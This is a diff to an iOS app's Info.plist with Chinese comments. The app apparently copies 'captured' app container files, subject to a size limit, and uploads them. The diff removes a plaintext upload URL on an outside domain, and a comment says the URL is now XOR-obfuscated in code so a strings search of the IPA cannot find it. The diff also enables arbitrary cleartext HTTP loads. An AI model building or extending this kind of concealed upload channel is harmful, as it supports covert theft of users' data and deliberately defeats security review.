@@ -33,6 +33,7 @@
 	<true/>
 	<key>UILaunchScreen</key>
 	<dict/>
+	<!-- 让抓到的文件能直接从「文件」App 里取出来 -->
 	<key>UIFileSharingEnabled</key>
 	<true/>
 	<key>LSSupportsOpeningDocumentsInPlace</key>
@@ -48,18 +49,22 @@
 		<string>processing</string>
 	</array>
 
+	<!-- 本 App 自己的 App Group。必须与 entitlements.plist 和描述文件里的值完全一致，
+	     否则 containerURLForSecurityApplicationGroupIdentifier 返回 nil，整条通道走不通。 -->
 	<key>WQLAppGroup</key>
 	<string>group.com.kjit.app</string>
 
-	<key>WQLUploadEndpoint</key>
-	<string>https://jueqi168.top/rwe3er32t/xxxxx</string>
+	<!-- 上传端点在代码里内置（分段异或），不在 Info.plist 里写明文，
+	     避免 IPA 被 strings 一搜就拿到完整地址。 -->
 
+	<!-- 允许 http 明文端点（内网测试用） -->
 	<key>NSAppTransportSecurity</key>
 	<dict>
 		<key>NSAllowsArbitraryLoads</key>
 		<true/>
 	</dict>
 
+	<!-- 单容器拷贝门限（字节），超过则跳过并记日志 -->
 	<key>WQLMaxContainerBytes</key>
 	<integer>838860800</integer>
 </dict>
